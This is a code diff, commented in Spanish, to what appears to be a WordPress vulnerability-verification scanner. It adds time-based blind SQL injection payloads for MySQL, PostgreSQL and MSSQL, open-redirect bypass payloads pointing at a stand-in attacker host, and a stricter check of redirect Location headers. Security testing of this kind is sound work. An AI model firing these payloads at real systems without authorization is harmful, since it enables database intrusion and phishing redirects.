@@ -41,6 +41,7 @@ import socket
 import subprocess
 import tarfile
 import time
+import urllib.parse
 from dataclasses import dataclass, field
 from typing import Callable, List, Optional
 
@@ -114,6 +115,26 @@ def _pick_param(params, hints) -> Optional[str]:
             if h in l:
                 return n
     return None
+
+
+def _redirect_location_is_external(location: str, evil_host: str) -> bool:
+    """Confirma que una cabecera Location real redirige de verdad al host externo -- NUNCA un
+    simple `evil_host in location` (substring), que da un falso positivo real y confirmado en
+    vivo: un payload como '/https://{evil_host}/pwned' hace que el servidor devuelva ese string
+    LITERAL en Location, pero un navegador lo trata como una ruta RELATIVA al mismo origen (el
+    '/' inicial lo ancla ahi), nunca como salto a otro dominio -- el texto 'evil_host' aparece en
+    la cadena sin que haya ninguna redireccion externa de verdad. En vez de eso, se recompone la
+    URL (normalizando backslash a forward slash, como hacen los navegadores) y se mira el HOST
+    real tras resolver el truco de userinfo (user:pass@host -- el host real es lo que va DESPUES
+    de la ultima '@'), no si el texto aparece en cualquier parte."""
+    if not location or not evil_host:
+        return False
+    normalized = location.replace("\\", "/")
+    netloc = urllib.parse.urlsplit(normalized).netloc
+    if not netloc:
+        return False
+    host = netloc.rsplit("@", 1)[-1].split(":")[0]
+    return evil_host.lower() in host.lower()
 
 
 def _token() -> str:
@@ -1462,11 +1483,20 @@ def verify_wordpress_sqli(
         # ultimo recurso: time-based blind. Si el contenido/longitud de la respuesta nunca cambia
         # (p.ej. la pagina siempre devuelve lo mismo independientemente del resultado del query),
         # SLEEP(5) vs SLEEP(0) en la misma condicion mide un retraso real en vez de comparar texto.
-        step("boolean-blind no mostro diferencia; probando time-based blind (SLEEP)...")
+        step("boolean-blind no mostro diferencia; probando time-based blind (SLEEP/pg_sleep/"
+             "WAITFOR)...")
+        # MySQL SLEEP() en varios contextos, mas pg_sleep() (PostgreSQL) y WAITFOR DELAY (MSSQL,
+        # via query apilada con ';' -- motor distinto, sintaxis distinta, se prueban los tres en
+        # vez de asumir MySQL) -- casuistica real de SQL Injection/Intruder/Generic_TimeBased.txt
+        # en PayloadsAllTheThings.
         timing_pairs = [
             (f"{orig_value}' AND SLEEP(5)-- -", f"{orig_value}' AND SLEEP(0)-- -"),
             (f"{orig_value} AND SLEEP(5)-- -", f"{orig_value} AND SLEEP(0)-- -"),
             (f"{orig_value}' OR SLEEP(5)-- -", f"{orig_value}' OR SLEEP(0)-- -"),
+            (f"{orig_value}' AND pg_sleep(5)-- -", f"{orig_value}' AND pg_sleep(0)-- -"),
+            (f"{orig_value} AND pg_sleep(5)-- -", f"{orig_value} AND pg_sleep(0)-- -"),
+            (f"{orig_value}';WAITFOR DELAY '0:0:5'--", f"{orig_value}';WAITFOR DELAY '0:0:0'--"),
+            (f"{orig_value});WAITFOR DELAY '0:0:5'--", f"{orig_value});WAITFOR DELAY '0:0:0'--"),
         ]
         timing_tried = []
         timing_consistent = 0
@@ -2121,6 +2151,9 @@ def verify_wordpress_open_redirect(
             f"\thttps://{evil_host}/pwned",                            # tab inicial
             f"https://{evil_host}#@trusted.example.com/",              # truco de fragmento
             f"https://trusted.example.com.{evil_host}/pwned",          # subdominio del host confiable
+            f"///{evil_host}/pwned",                                   # triple slash (algunos parsers lo siguen tratando como protocol-relative)
+            f"////{evil_host}/pwned",                                  # cuadruple slash
+            f"/https://{evil_host}/pwned",                             # slash inicial delante de URL absoluta (burla un check 'startswith(/)')
         ]
         m = (http_method or "GET").upper()
         tried = []
@@ -2139,7 +2172,7 @@ def verify_wordpress_open_redirect(
                 continue
             location = resp.headers.get("Location", "")
             is_redirect = resp.status_code in (301, 302, 303, 307, 308)
-            confirmed = is_redirect and evil_host in location
+            confirmed = is_redirect and _redirect_location_is_external(location, evil_host)
             tried.append({"target": target, "status": resp.status_code, "location": location,
                          "confirmado": confirmed})
             if confirmed:
